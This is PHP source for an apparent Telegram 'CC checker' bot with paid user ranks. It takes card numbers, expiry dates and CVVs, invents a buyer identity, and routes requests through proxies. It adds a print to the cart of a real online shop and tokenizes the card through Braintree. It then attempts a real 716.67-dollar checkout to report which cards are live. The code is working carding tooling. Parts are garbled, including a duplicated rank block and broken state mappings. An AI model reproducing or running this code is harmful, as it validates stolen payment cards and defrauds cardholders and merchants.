<?php
//=========RANK DETERMINE=========//
$currentDate = date('Y-m-d');
    $rank = "FREE";
    $expiryDate = "0";

    $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
    $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
    $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

    if(in_array($userId, $owners)) {
        $rank = "OWNER";
       $expiryDate = "UNTIL DEAD"; 
    } else { 
        foreach ($paidUsers as $index => $line) {
            list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
            if ($userIdFromFile == $userId) {
                if ($userExpiryDate < $currentDate) {
                    unset($paidUsers[$index]); //
                    file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                    $freeUsers[] = $userId; // add to free users list
                    file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                } else    $currentDate = date('Y-m-d');
    $rank = "FREE";
    $expiryDate = "0";

    $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
    $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
    $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

    if(in_array($userId, $owners)) {
        $rank = "OWNER";
       $expiryDate = "UNTIL DEAD"; 
    } else {
        foreach ($paidUsers as $index => $line) {
            list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
            if ($userIdFromFile == $userId) {
                if ($userExpiryDate < $currentDate) {
                    unset($paidUsers[$index]); 
                    file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                    $freeUsers[] = $userId; 
                    file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                } else {
                    $rank = "PAID";
                    $expiryDate = $userExpiryDate;
                }
            }
        }
    } {
                    $rank = "PAID";
                    $expiryDate = $userExpiryDate;
                }
            }
        }
    }
//=======RANK DETERMINE END=========//
$update = json_decode(file_get_contents("php://input"), TRUE);
$text = $update["message"]["text"];
//========WHO CAN CHECK FUNC========//

//=====WHO CAN CHECK FUNC END======//
if (preg_match('/^(\/sau|\.sau|!sau)/', $text)) {
    $userid = $update['message']['from']['id'];
//$abr = ("Hey");


    if (!checkAccess($userid)) {
        sendMessage($chatId, "<b>You're not allowed to use this command</b>", $message_id);
        exit();
    } else {

  
  $start_time = microtime(true);
    
  $chatId = $update["message"]["chat"]["id"];
    $message_id = $update["message"]["message_id"];
    $keyboard = "";

//=======WHO CAN CHECK END========//

//====ANTISPAM AND WRONG FORMAT====//
    if (strlen($message) <= 4) {
            sendMessage($chatId, '<b>• Wrong Format! ⚠️</b>%0A• 𝘚𝘦𝘯𝘥 <code>/chk cc|mm|yy|cvv</code>%0A• 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 <code>Evander</code>', $message_id);
            exit();
  }

//==ANTISPAM AND WRONG FORMAT END==//

    
//=======checker part start========//
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
function pro($stringlength = 16) {
    return substr(str_shuffle(str_repeat($string='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', ceil($stringlength/strlen($string)) )),1,$stringlength);
}

#$key = pro();
$web = pro();

$lista = substr($message, 5);
$separa = explode("|", $lista);
$cc = isset($separa[0]) ? substr($separa[0], 0, 16) : ''; // Get only first 16 digits
$mes = isset($separa[1]) ? $separa[1] : '';
$ano = isset($separa[2]) ? $separa[2] : '';
$cvv = isset($separa[3]) ? $separa[3] : '';


$last4 = substr($cc, -4);


$sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b>
  🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: B3xVBV
Status: <code>□□□□□ 0%[🟥]</code>
Req: <code>@$username</code>
</b>");
  
function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//================[Functions and Variables]================//
#------[Email Generator]------#



function emailGenerate($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . '@gmail.com';
}
$email = emailGenerate();
#------[Username Generator]------#
function usernameGen($length = 13)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$un = usernameGen();
#------[Password Generator]------#
function passwordGen($length = 15)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$pass = passwordGen();

#------[CC Type Randomizer]------#

 $cardNames = array(
    "3" => "American Express",
    "4" => "Visa",
    "5" => "MasterCard",
    "6" => "Discover"
 );
 $card_type = $cardNames[substr($cc, 0, 1)];



  
sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>
  🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: B3xVBV
Status: <code>■□□□□ 20%[⬛]</code>
Req: <code>@$username</code>
</b>");

  //==================[Randomizing Details]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$postcode = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$num = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

//==============[Randomizing Details-END]======================//


  //==================[BIN LOOK-UP]======================//

  $bin = substr($lista, 0,6);
  $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$bin.'');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = strtoupper(GetStr($fim, '"name":"', '"'));
$brand = strtoupper(GetStr($fim, '"brand":"', '"'));
$country = strtoupper(GetStr($fim, '"country":{"name":"', '"'));
$scheme = strtoupper(GetStr($fim, '"scheme":"', '"'));
$emoji = GetStr($fim, '"emoji":"', '"');
$type =strtoupper(GetStr($fim, '"type":"', '"'));

  
//==================[BIN LOOK-UP-END]======================//




//=======================[1 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.countereditions.com/checkout/cart/add/uenc/aHR0cHM6Ly93d3cuY291bnRlcmVkaXRpb25zLmNvbS9tZWRpdW0vZXRjaGluZy9qYWtlLWFuZC1kaW5vcy1jaGFwbWFuLWxpbWl0ZWQtZWRpdGlvbi1wcmludC0xMjM4dS5odG1s/product/128/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: www.countereditions.com';
$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'Accept-Language: en-US,en;q=0.6';
$headers[] = 'Content-Type: multipart/form-data; boundary=----'.$web.'';
$headers[] = 'Path: /checkout/cart/add/uenc/aHR0cHM6Ly93d3cuY291bnRlcmVkaXRpb25zLmNvbS9tZWRpdW0vZXRjaGluZy9qYWtlLWFuZC1kaW5vcy1jaGFwbWFuLWxpbWl0ZWQtZWRpdGlvbi1wcmludC0xMjM4dS5odG1s/product/128/';
$headers[] = 'Cookie: form_key=sCnrdNWGT829z3lO; private_content_version=5ae7c22c5f195883caac5120d647e4f6; PHPSESSID=3iou0shh4t8gpflpltm8ctl00i; form_key=sCnrdNWGT829z3lO; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; searchReport-log=0';
$headers[] = 'Origin: https://www.countereditions.com';
$headers[] = 'Referer: https://www.countereditions.com/medium/etching/jake-and-dinos-chapman-limited-edition-print-1238u.html';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36';
$headers[] = 'X-Requested-With: XMLHttpRequest';

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '------'.$web.'
Content-Disposition: form-data; name="product"

128
------'.$web.'
Content-Disposition: form-data; name="selected_configurable_option"


------'.$web.'
Content-Disposition: form-data; name="related_product"


------'.$web.'
Content-Disposition: form-data; name="item"

128
------'.$web.'
Content-Disposition: form-data; name="form_key"

sCnrdNWGT829z3lO
------'.$web.'
Content-Disposition: form-data; name="qty"

1
------'.$web.'--
');

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result1 = curl_exec($ch);


//=======================[5 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.countereditions.com/checkout/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: www.countereditions.com';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.6';
$headers[] = 'Path: /checkout/';
$headers[] = 'Cookie: form_key=sCnrdNWGT829z3lO; PHPSESSID=3iou0shh4t8gpflpltm8ctl00i; form_key=sCnrdNWGT829z3lO; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; searchReport-log=0; private_content_version=3a82dcb83db158beedd06497b06d3047; section_data_ids=%7B%22cart%22%3A1693852940%2C%22directory-data%22%3A1693851918%2C%22cartdash%22%3A1693852918%2C%22messages%22%3Anull%7D';
$headers[] = 'Referer: https://www.countereditions.com/checkout/cart/';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36';

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result1 = curl_exec($ch);

$merchant = trim(strip_tags(getStr($result1, '"merchantId":"','"')));

// ENCODED BEARER
$enbearer = trim(strip_tags(getstr($result1, '"clientToken":"','",')));

// DECODED BEARER
$decode = base64_decode($enbearer);

// MAIN BEARER
$bearer = trim(strip_tags(getstr($decode, '"authorizationFingerprint":"','",')));
//echo "bearer: $bearer <br>";
//echo "merchant: $merchant <br>";


//===============REQ 1 END ===============//
sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>
  🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: B3xVBV
Status: <code>■■■□□ 50%[🟧]</code>
Req: <code>@$username</code>
</b>");

//=================REQ 4===============//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'host: payments.braintree-api.com';
$headers[] = 'path: /graphql';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.7';
$headers[] = 'content-type: application/json';
$headers[] = 'Authorization: Bearer '.$bearer.'';
$headers[] = 'Braintree-Version: 2018-05-10';
$headers[] = 'origin: https://assets.braintreegateway.com';
$headers[] = 'referer: https://assets.braintreegateway.com/';
$headers[] = 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: cross-site';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188'; 

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"bc00e723-b52e-448d-9c8f-fb0f5f265353"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}
');

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result3 = curl_exec($ch);
$token = trim(strip_tags(getstr($result3, '"token":"','"')));



//-------------------Req 2--------------//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.braintreegateway.com/merchants/'.$merchant.'/client_api/v1/payment_methods/'.$token.'/three_d_secure/lookup');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Accept: */*';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Host: api.braintreegateway.com';
$headers[] = 'Origin: https://www.countereditions.com';
$headers[] = 'Referer: https://www.countereditions.com/';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"amount":"716.67","additionalInfo":{"billingLine1":"5th Ave","billingCity":"New York","billingState":"NY","billingPostalCode":"10080","billingCountryCode":"US","billingPhoneNumber":"9234736262","billingGivenName":"'.$firstname.'","billingSurname":"'.$lastname.'"},"dfReferenceId":"1_b9b7fcf7-0046-451c-826d-1d2e5e4b2efa","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.79.1","cardinalDeviceDataCollectionTimeElapsed":347},"authorizationFingerprint":"'.$bearer.'","braintreeLibraryVersion":"braintree/web/3.79.1","_meta":{"merchantAppId":"www.countereditions.com","platform":"web","sdkVersion":"3.79.1","source":"client","integration":"custom","integrationType":"custom","sessionId":"bc00e723-b52e-448d-9c8f-fb0f5f265353"}}
');

$lookup = curl_exec($ch);
$status = trim(strip_tags(getstr($lookup, '"status":"','"')));
$enrolled = preg_replace('/_/', ' ', ucfirst(trim(strip_tags(getstr($lookup, '"enrolled":"','"')))));
$nonce = preg_replace('/_/', ' ', ucfirst(trim(strip_tags(getstr($lookup, '"nonce":"','"')))));

if ($status == "authenticate_successful") {
    $status = $status . " ✅";
    }
elseif ($status == "authenticate_attempt_successful") {    
    $status = $status . " ✅";
    } 
else {
    $status = $status . " ❌";
    }


//===============REQ 2 END ===============//

sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: B3xVBV
Status: <code>■■■■□ 80%[🟨]</code>
Req: <code>@$username</code>
</b>");  

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.countereditions.com/rest/default/V1/guest-carts/x66dy5ui7or60mpRfScjGwgKxgV0QTbY/payment-information');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'host: www.countereditions.com';
$headers[] = 'path: /rest/default/V1/guest-carts/x66dy5ui7or60mpRfScjGwgKxgV0QTbY/payment-information';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.6';
$headers[] = 'content-type: application/json';
$headers[] = 'cookie: form_key=sCnrdNWGT829z3lO; PHPSESSID=3iou0shh4t8gpflpltm8ctl00i; form_key=sCnrdNWGT829z3lO; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; searchReport-log=0; private_content_version=78c4360fc1789df20b2729ca3fac065c; section_data_ids=%7B%22cart%22%3A1693853216%2C%22directory-data%22%3A1693851918%2C%22cartdash%22%3A1693852216%2C%22messages%22%3A1693852216%7D';
$headers[] = 'origin: https://www.countereditions.com';
$headers[] = 'referer: https://www.countereditions.com/checkout/';
$headers[] = 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188'; 
$headers[] = 'x-requested-with: XMLHttpRequest';

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"paymentMethod":{"extension_attributes":{"agreement_ids":["1"]},"method":"braintree","additional_data":{"payment_method_nonce":"'.$nonce.'","device_data":"{\"device_session_id\":\"892b7dc9f22e80ec4d1f4dbf5d319075\",\"fraud_merchant_id\":null,\"correlation_id\":\"5d72d576fd7c4a597ac92d804ef97026\"}"}},"shippingAddress":{"countryId":"US","regionId":"43","regionCode":"NY","region":"New York","street":["5th Ave"],"telephone":"9234736262","postcode":"10080","city":"New York","firstname":"'.$firstname.'","lastname":"'.$lastname.'","saveInAddressBook":null,"extension_attributes":{"isUseBillingAddress":"0"}},"shippingMethod":{"shipping_method_code":"amstrates1","shipping_carrier_code":"amstrates"},"subscribe":{"subscribeToNewsletter":false},"registration":{"iosc-register-pwd":"","iosc-register-pwd-confirm":""},"customerEmail":"'.$email.'","billingAddress":{"countryId":"US","regionId":"43","regionCode":"NY","region":"New York","street":["5th Ave"],"telephone":"9234736262","postcode":"10080","city":"New York","firstname":"'.$firstname.'","lastname":"'.$lastname.'","saveInAddressBook":null,"extension_attributes":{"isUseBillingAddress":"0"}},"cartId":"x66dy5ui7or60mpRfScjGwgKxgV0QTbY","email":"'.$email.'"}
');


curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result5 = curl_exec($ch);
$response_array = json_decode($result5, true);

if ($response_array !== null) {
    $msg = $response_array['message'];
    //echo $msg;
} else {
    //echo "Error decoding JSON.";
}


//=======================[MADE BY SIFAT]==============================//



sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>
  🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: B3xVBV
Status: <code>■■■■■ 100%[🟩]</code>
Req: <code>@$username</code>
</b>");
$end_time = microtime(true);
$time = number_format($end_time - $start_time, 2);
  
  //======checker part end=========//


if(strpos($result5, "Thank you.")) {

  $resp = "
Card -» <code>$lista</code>  	
Status -» <b>Approved ✅</b>
Result -» <b>Thank you for purchase ✅</b>
Gateway -» <b>Braintree</b>
———»Details«———
Country -» <b>$name</b>
Brand -» <b>$scheme-$type-$brand</b>
Bank -» <b>$bank</b>
———-»Info«-———-
Proxy -» Live! ✅
Time taken -» <b>$time seconds</b> 
Req By -» @$username/<b>[$rank]</b>
Dev -» <code>@ownerb3</code>

";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. No Account")) {
$resp = "
Card -» <code>$lista</code> 
Status -» <b>Declined 🚫</b>
Result -» <b>No Account</b>
Gateway -» <b>Braintree</b>
———»Details«———
Country -» <b>$name</b>
Brand -» <b>$scheme-$type-$brand</b>
Bank -» <b>$bank</b>
———-»Info«-———-
Proxy -» Live! ✅
Time taken -» <b>$time seconds</b> 
Req By -» @$username/<b>[$rank]</b>
Dev -» <code>@ownerb3</code>

";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}


elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Gateway Rejected: three_d_secure")) {
$resp = "
Card -» <code>$lista</code> 
Status -» <b>Declined 🚫</b>
Result -» <b>Gateway Rejected: three_d_secure</b>
Gateway -» <b>Braintree</b>
———»Details«———
Country -» <b>$name</b>
Brand -» <b>$scheme-$type-$brand</b>
Bank -» <b>$bank</b>
———-»Info«-———-
Proxy -» Live! ✅
Time taken -» <b>$time seconds</b> 
Req By -» @$username/<b>[$rank]</b>
Dev -» <code>@ownerb3</code>

";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Transaction Not Allowed")) {
$resp = "
Card -» <code>$lista</code> 
Status -» <b>Declined 🚫</b>
Result -» <b>Transaction Not Allowed</b>
Gateway -» <b>Braintree</b>
———»Details«———
Country -» <b>$name</b>
Brand -» <b>$scheme-$type-$brand</b>
Bank -» <b>$bank</b>
———-»Info«-———-
Proxy -» Live! ✅
Time taken -» <b>$time seconds</b> 
Req By -» @$username/<b>[$rank]</b>
Dev -» <code>@ownerb3</code>

";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Invalid Transaction")) {
$resp = "
Card -» <code>$lista</code> 
Status -» <b>Declined 🚫</b>
Result -» <b>Invalid Transaction</b>
Gateway -» <b>Braintree</b>
———»Details«———
Country -» <b>$name</b>
Brand -» <b>$scheme-$type-$brand</b>
Bank -» <b>$bank</b>
———-»Info«-———-
Proxy -» Live! ✅
Time taken -» <b>$time seconds</b> 
Req By -» @$username/<b>[$rank]</b>
Dev -» <code>@ownerb3</code>

";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Processor Declined - Fraud Suspected")) {
$resp = "
